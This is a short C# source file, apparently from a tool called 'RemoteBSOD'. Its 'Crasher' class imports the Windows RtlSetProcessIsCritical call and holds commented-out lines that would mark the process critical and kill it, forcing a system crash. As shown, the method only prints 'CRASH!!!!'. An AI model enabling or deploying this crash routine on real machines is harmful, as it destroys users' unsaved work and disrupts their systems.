using System;
using System;
using System.Runtime.InteropServices;
using RemoteBSOD;

public class Crasher : ConsoleScript
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    public static void CrashWindows()
    {
        try
        {
            PrintLine("CRASH!!!!", ConsoleColor.Red);
            //System.Diagnostics.Process.EnterDebugMode();
            //RtlSetProcessIsCritical(1, 0, 0);
            //System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        catch (Exception _ex)
        {
            PrintError($"Exception found -> {_ex}");
        }
    }
}